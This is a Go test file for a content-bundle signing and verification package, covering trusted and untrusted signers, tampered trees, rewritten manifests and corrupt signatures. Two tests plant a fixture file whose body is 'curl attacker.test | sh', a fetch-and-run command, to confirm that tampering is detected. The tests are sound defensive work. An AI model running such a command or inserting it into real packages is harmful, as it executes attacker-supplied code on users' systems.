package attest

import (
	"context"
	"crypto/ed25519"
	"crypto/rand"
	"io/fs"
	"os"
	"path/filepath"
	"testing"
	"time"

	"github.com/spf13/afero"
	"github.com/stretchr/testify/assert"
	"github.com/stretchr/testify/require"
	"golang.org/x/crypto/ssh"

	"github.com/ctxloom/ctxloom/internal/adapters/content"
	"github.com/ctxloom/ctxloom/internal/adapters/signing"
	"github.com/ctxloom/ctxloom/internal/adapters/signing/allowedsigners"
	"github.com/ctxloom/ctxloom/internal/core/trust"
)

const storeRoot = "/store"

var (
	ctx     = context.Background()
	now     = time.Date(2026, 7, 30, 12, 0, 0, 0, time.UTC)
	solid   = trust.Ref{Bundle: "code-quality", Kind: trust.KindFragment, Name: "solid", IsLocal: true}
	tricky  = trust.Ref{Bundle: "code-quality", Kind: trust.KindFragment, Name: "tricky", IsLocal: true}
	solidFS = "fragments/solid.md"
)

func fixture(t *testing.T) (*content.TreeStore, content.Bundle, afero.Fs) {
	t.Helper()
	fsys := afero.NewMemMapFs()
	src := filepath.Join("..", "testdata", "tree")
	err := filepath.WalkDir(src, func(p string, d fs.DirEntry, err error) error {
		if err != nil {
			return err
		}
		rel, err := filepath.Rel(src, p)
		if err != nil {
			return err
		}
		target := filepath.Join(storeRoot, rel)
		if d.IsDir() {
			return fsys.MkdirAll(target, 0o755)
		}
		data, err := os.ReadFile(p)
		if err != nil {
			return err
		}
		return afero.WriteFile(fsys, target, data, 0o644)
	})
	require.NoError(t, err)
	store, err := content.NewTreeStore(fsys, storeRoot, content.Provenance{IsLocal: true})
	require.NoError(t, err)
	b, err := store.Open(ctx, "code-quality")
	require.NoError(t, err)
	return store, b, fsys
}

func testSigner(t *testing.T) (ssh.Signer, ssh.PublicKey) {
	t.Helper()
	_, priv, err := ed25519.GenerateKey(rand.Reader)
	require.NoError(t, err)
	s, err := ssh.NewSignerFromSigner(priv)
	require.NoError(t, err)
	return s, s.PublicKey()
}

func rootTrusting(entries ...allowedsigners.Entry) *allowedsigners.Store {
	return allowedsigners.NewStore(entries...)
}

func publisher(principal string, pub ssh.PublicKey) allowedsigners.Entry {
	return allowedsigners.Entry{Principals: []string{principal}, Namespaces: []string{signing.NamespacePublish}, PublicKey: pub}
}

func write(t *testing.T, fsys afero.Fs, rel, body string) {
	t.Helper()
	p := filepath.Join(storeRoot, "code-quality", rel)
	require.NoError(t, fsys.MkdirAll(filepath.Dir(p), 0o755))
	require.NoError(t, afero.WriteFile(fsys, p, []byte(body), 0o644))
}

func TestSignBundle_ThenVerifyBundle_IsVerified(t *testing.T) {
	store, b, _ := fixture(t)
	signer, pub := testSigner(t)
	require.NoError(t, SignBundle(ctx, store, b, fixtureRel(t), signer))

	v, err := VerifyBundle(ctx, b, rootTrusting(publisher("pub@example.test", pub)), now)
	require.NoError(t, err)
	assert.Equal(t, StatusManifestSigned, v.Status)
	assert.Equal(t, "pub@example.test", v.Principal)
	assert.NoError(t, v.Contents)
	assert.Equal(t, AuthorityManifest, v.Authority)
}

func TestVerifyBundle_UnsignedIsQuietlyUnattested(t *testing.T) {
	_, b, _ := fixture(t)
	_, pub := testSigner(t)
	v, err := VerifyBundle(ctx, b, rootTrusting(publisher("pub@example.test", pub)), now)
	require.NoError(t, err, "an unsigned bundle is ordinary, not an error")
	assert.Equal(t, StatusUnattested, v.Status)
	assert.Empty(t, v.Principal)
}

func TestVerifyBundle_SignedByAnUntrustedKeyIsUnattestedNotTampered(t *testing.T) {
	store, b, _ := fixture(t)
	signer, _ := testSigner(t)
	_, otherPub := testSigner(t)
	require.NoError(t, SignBundle(ctx, store, b, fixtureRel(t), signer))

	v, err := VerifyBundle(ctx, b, rootTrusting(publisher("someone-else", otherPub)), now)
	require.NoError(t, err)
	assert.Equal(t, StatusUnattested, v.Status)
}

// UNATTESTED covers two different facts, and the verdict must let a caller tell
// them apart: this bundle IS signed, by a key nothing here trusts. The status is
// deliberately the same as unsigned (the decision is the same); the fingerprint
// is what makes the DIAGNOSIS different. Display only — no status, principal or
// authority moves because of it.
func TestVerifyBundle_UntrustedSignerIsNamedForComparisonNotTrusted(t *testing.T) {
	store, b, _ := fixture(t)
	signer, pub := testSigner(t)
	_, otherPub := testSigner(t)
	require.NoError(t, SignBundle(ctx, store, b, fixtureRel(t), signer))

	v, err := VerifyBundle(ctx, b, rootTrusting(publisher("someone-else", otherPub)), now)
	require.NoError(t, err)
	assert.Equal(t, ssh.FingerprintSHA256(pub), v.UntrustedSignerFingerprint,
		"an unattested-because-untrusted verdict names the key it refused")
	assert.Equal(t, StatusUnattested, v.Status, "naming the key must not upgrade the verdict")
	assert.Empty(t, v.Principal, "and must not invent a principal")
	assert.False(t, v.OK())
}

// The other half: with NO signature at all there is no key to name, so the
// fingerprint stays empty and the listing above this can honestly say
// "unsigned" rather than "signed by someone you do not trust".
func TestVerifyBundle_UnsignedNamesNoKey(t *testing.T) {
	_, b, _ := fixture(t)
	_, pub := testSigner(t)
	v, err := VerifyBundle(ctx, b, rootTrusting(publisher("pub@example.test", pub)), now)
	require.NoError(t, err)
	assert.Equal(t, StatusUnattested, v.Status)
	assert.Empty(t, v.UntrustedSignerFingerprint)
}

// A VERIFIED bundle has a real identity to show, so the display-only field
// stays empty: it exists only for the case with no identity at all, and a
// fingerprint rendered beside a verified principal would be noise at best and
// read as corroboration at worst.
func TestVerifyBundle_VerifiedCarriesNoDisplayFingerprint(t *testing.T) {
	store, b, _ := fixture(t)
	signer, pub := testSigner(t)
	require.NoError(t, SignBundle(ctx, store, b, fixtureRel(t), signer))

	v, err := VerifyBundle(ctx, b, rootTrusting(publisher("pub@example.test", pub)), now)
	require.NoError(t, err)
	assert.Equal(t, StatusManifestSigned, v.Status)
	assert.Empty(t, v.UntrustedSignerFingerprint)
}

// F3(a): a key trusted ONLY for approve must not satisfy the publish slot.
func TestVerifyBundle_ApproveOnlyKeyCannotSatisfyThePublishSlot(t *testing.T) {
	store, b, _ := fixture(t)
	signer, pub := testSigner(t)
	require.NoError(t, SignBundle(ctx, store, b, fixtureRel(t), signer))

	approveOnly := rootTrusting(allowedsigners.Entry{
		Principals: []string{"reviewer"}, Namespaces: []string{signing.NamespaceApprove}, PublicKey: pub,
	})
	v, err := VerifyBundle(ctx, b, approveOnly, now)
	require.NoError(t, err)
	assert.Equal(t, StatusUnattested, v.Status)
}

// HOSTILE PUBLISHER, the headline F2 case: a directory added to a signed tree
// that no SurfaceType enumerates. Only the manifest's reverse direction sees it.
func TestVerifyBundle_ExtraDirectoryInASignedTreeIsCaught(t *testing.T) {
	store, b, fsys := fixture(t)
	signer, pub := testSigner(t)
	require.NoError(t, SignBundle(ctx, store, b, fixtureRel(t), signer))

	write(t, fsys, "evil/payload.sh", "curl attacker.test | sh\n")

	v, err := VerifyBundle(ctx, b, rootTrusting(publisher("pub@example.test", pub)), now)
	require.NoError(t, err)
	assert.Equal(t, StatusManifestSigned, v.Status, "the manifest's own signature still verifies")
	require.Error(t, v.Contents, "but the TREE must not verify")
	var ce *content.ContentsError
	require.ErrorAs(t, v.Contents, &ce)
	assert.Equal(t, []string{"evil/payload.sh"}, ce.Unclaimed)
	assert.False(t, v.OK(), "a bundle whose tree does not match its manifest is not OK")
}

// HOSTILE PUBLISHER, F2's typo half: a mis-extensioned hook is a silently
// withheld guardrail. Signing must refuse to produce such a bundle at all.
func TestSignBundle_RefusesATreeWithAnUnrecognisedFileInAKindDirectory(t *testing.T) {
	store, b, fsys := fixture(t)
	signer, _ := testSigner(t)
	write(t, fsys, "hooks/pre_tool/typo.yml", "event: pre_tool\n")

	err := SignBundle(ctx, store, b, fixtureRel(t), signer)
	require.Error(t, err)
	assert.ErrorIs(t, err, content.ErrUnclaimed)
}

// The residual hostile case SignBundle cannot prevent: a third party hand-crafts
// a tree whose manifest DOES cover a mis-extensioned hook, and signs it. The
// tree then matches its manifest perfectly, so VerifyContents is happy — and the
// guardrail still does not exist, because nothing enumerates it as an item.
// Verification must refuse the bundle outright rather than report it healthy.
func TestVerifyBundle_ACoveredButUnrecognisedFileStillRefusesTheBundle(t *testing.T) {
	store, b, fsys := fixture(t)
	signer, pub := testSigner(t)

	// Build and sign the manifest directly, bypassing SignBundle's refusal, to
	// stand in for a tree ctxloom did not produce.
	write(t, fsys, "hooks/pre_tool/typo.yml", "event: pre_tool\n")
	m, err := content.BuildManifest(ctx, b, fixtureRel(t))
	require.NoError(t, err)
	require.NoError(t, store.PutManifest(ctx, b.ID(), m))
	_, covered := m.Lookup("hooks/pre_tool/typo.yml")
	require.True(t, covered, "the manifest covers by PATH, so the typo is legitimately covered")
	sig, err := signing.Sign(m.Bytes(), signer, signing.NamespacePublish)
	require.NoError(t, err)
	require.NoError(t, store.PutBundleSignature(ctx, b.ID(), content.Namespace(signing.NamespacePublish), signer.PublicKey(), sig))

	require.NoError(t, m.VerifyContents(ctx, b), "integrity alone is satisfied — which is the trap")

	_, err = VerifyBundle(ctx, b, rootTrusting(publisher("pub@example.test", pub)), now)
	require.Error(t, err)
	assert.ErrorIs(t, err, content.ErrUnclaimed)
}

func TestVerifyBundle_EditedFileUnderASignedManifestIsTampered(t *testing.T) {
	store, b, fsys := fixture(t)
	signer, pub := testSigner(t)
	require.NoError(t, SignBundle(ctx, store, b, fixtureRel(t), signer))

	write(t, fsys, solidFS, "---\ntags: []\n---\nsubstituted body\n")

	v, err := VerifyBundle(ctx, b, rootTrusting(publisher("pub@example.test", pub)), now)
	require.NoError(t, err)
	require.Error(t, v.Contents)
	assert.False(t, v.OK(), "a signature over a manifest the tree no longer matches attests nothing")
}

// F10 at bundle level: rewriting the manifest to cover the added file must NOT
// strip the attestation. The bundle signature is filed at a fixed key, so it
// stays reachable and FAILS, rather than becoming unreachable and reading as
// "unsigned".
func TestVerifyBundle_RewritingTheManifestIsTamperedNotUnsigned(t *testing.T) {
	store, b, fsys := fixture(t)
	signer, pub := testSigner(t)
	require.NoError(t, SignBundle(ctx, store, b, fixtureRel(t), signer))

	write(t, fsys, "evil/payload.sh", "curl attacker.test | sh\n")
	m, err := content.BuildManifest(ctx, b, fixtureRel(t))
	require.NoError(t, err)
	require.NoError(t, store.PutManifest(ctx, b.ID(), m))

	v, err := VerifyBundle(ctx, b, rootTrusting(publisher("pub@example.test", pub)), now)
	require.NoError(t, err)
	assert.Equal(t, StatusTampered, v.Status)
	assert.False(t, v.OK())
}

// A corrupted signature blob is a tamper signal, never a silent downgrade to
// unsigned.
func TestVerifyBundle_CorruptSignatureBlobIsTampered(t *testing.T) {
	store, b, fsys := fixture(t)
	signer, pub := testSigner(t)
	require.NoError(t, SignBundle(ctx, store, b, fixtureRel(t), signer))

	sigs, err := b.BundleSignatures(ctx)
	require.NoError(t, err)
	require.Len(t, sigs, 1)
	names, err := afero.ReadDir(fsys, filepath.Join(storeRoot, "code-quality", ".sigs"))
	require.NoError(t, err)
	require.Len(t, names, 1)
	require.NoError(t, afero.WriteFile(fsys, filepath.Join(storeRoot, "code-quality", ".sigs", names[0].Name()), []byte("not a signature"), 0o644))

	v, err := VerifyBundle(ctx, b, rootTrusting(publisher("pub@example.test", pub)), now)
	require.NoError(t, err)
	assert.Equal(t, StatusTampered, v.Status)
}

// Signing twice with the same key over an unchanged tree is idempotent: the
// signature store files an entry under its signing key, so the second write
// lands on the first. (A re-sign after an EDIT is resign_test.go's case.)
func TestSignBundle_IsIdempotentForOneKey(t *testing.T) {
	store, b, _ := fixture(t)
	signer, pub := testSigner(t)
	require.NoError(t, SignBundle(ctx, store, b, fixtureRel(t), signer))
	require.NoError(t, SignBundle(ctx, store, b, fixtureRel(t), signer))

	v, err := VerifyBundle(ctx, b, rootTrusting(publisher("pub@example.test", pub)), now)
	require.NoError(t, err)
	assert.Equal(t, StatusManifestSigned, v.Status)
}

